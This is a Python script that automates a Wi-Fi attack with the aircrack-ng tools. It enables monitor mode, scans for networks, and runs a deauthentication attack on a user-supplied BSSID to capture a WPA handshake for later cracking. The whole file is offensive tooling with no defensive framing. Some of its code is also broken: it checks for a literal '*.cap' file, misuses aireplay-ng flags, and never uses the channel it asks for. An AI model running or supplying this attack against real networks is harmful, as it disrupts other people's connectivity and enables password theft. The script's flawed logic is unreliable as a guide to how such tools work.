import os
import subprocess

# Function to run a command in the terminal
def run_command(command):
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    output, error = process.communicate()
    return output.decode(), error.decode()

# Function to create a directory if it doesn't exist
def create_directory(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)

# Enable monitor mode on a wireless interface using airmon-ng
def enable_monitor_mode(interface):
    print(f"Enabling monitor mode on {interface}...")
    command = f"airmon-ng start {interface}"
    output, error = run_command(command)
    print(output)
    if error:
        print(f"Error enabling monitor mode: {error}")
        return False
    return True

# Scan for available wireless networks using airodump-ng
def scan_wireless_networks(interface, output_dir):
    print(f"Scanning for wireless networks on {interface}...")
    create_directory(output_dir)
    command = f"airodump-ng --output-format csv --write {output_dir}/output {interface}"
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    try:
        process.wait(timeout=15)  # Wait for 15 seconds
    except subprocess.TimeoutExpired:
        process.terminate()
        print("Scan completed.")
        return True
    print("Timeout occurred. Scan interrupted.")
    return False

# Perform a deauthentication attack using aireplay-ng to capture a handshake
def perform_deauthentication_attack(bssid, channel, interface, output_file):
    print("Performing deauthentication attack...")
    command = f"aireplay-ng --deauth 5 -a {bssid} -c FF:FF:FF:FF:FF:FF -e {bssid} -i {interface}"
    output, error = run_command(command)
    if error:
        print(f"Error performing deauthentication attack: {error}")
        return False
    print(output)
    print("Deauthentication attack completed.")

    # Check if the handshake file exists
    if os.path.exists("*.cap"):
        # Rename the handshake file to the specified name
        os.rename("*.cap", output_file)
        print(f"Handshake file saved as {output_file}")
        return True
    else:
        print("Handshake file not found.")
        return False

# Main program
if __name__ == "__main__":
    interface = input("Enter the wireless interface: ")
    output_dir = input("Enter the output directory path: ")
    output_file = input("Enter the name for the handshake file (without extension): ")
    output_file = os.path.join(output_dir, f"{output_file}.cap")

    # Enable monitor mode
    if enable_monitor_mode(interface):
        # Scan for wireless networks
        if scan_wireless_networks(interface, output_dir):
            # Prompt for the target network BSSID and channel
            bssid = input("Enter the target network BSSID: ")
            channel = input("Enter the target network channel: ")

            # Perform deauthentication attack and capture the handshake
            perform_deauthentication_attack(bssid, channel, interface, output_file)
